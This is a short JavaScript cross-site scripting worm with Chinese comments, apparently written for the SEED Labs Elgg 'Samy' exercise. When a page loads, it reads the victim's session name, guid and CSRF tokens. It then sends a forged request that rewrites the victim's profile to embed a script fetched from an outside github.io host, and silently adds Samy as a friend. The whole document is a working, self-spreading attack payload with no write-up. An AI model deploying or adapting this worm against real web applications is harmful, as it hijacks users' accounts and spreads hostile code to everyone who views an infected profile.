<script type="text/javascript">
window.onload = function() {
    var Ajax = null;
    var Ajax2 = null;
    // 提取所需的数据
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造要更新的个人资料描述
    var content = userName + guid + ts + token + "&description= <script type=\"text/javascript\" src=\"https://pinjunchen.github.io/IntroInfoSe/XSSwormNEW.js\"></script>";

    // Samy 的 GUID
    var samyGuid = 59;

    // 修改个人资料的 URL
    var profileEditUrl = "http://www.seed-server.com/action/profile/edit";

    // 添加好友的 URL
    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=59"+ ts + token;

    // 如果当前用户不是 Samy，进行操作
    if (elgg.session.user.guid != samyGuid) {
        // 发送 POST 请求以修改个人资料
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", profileEditUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // 发送 GET 请求以添加 Samy 为好友
        Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", addFriendUrl, true);
        Ajax2.send();
    }
}
</script>
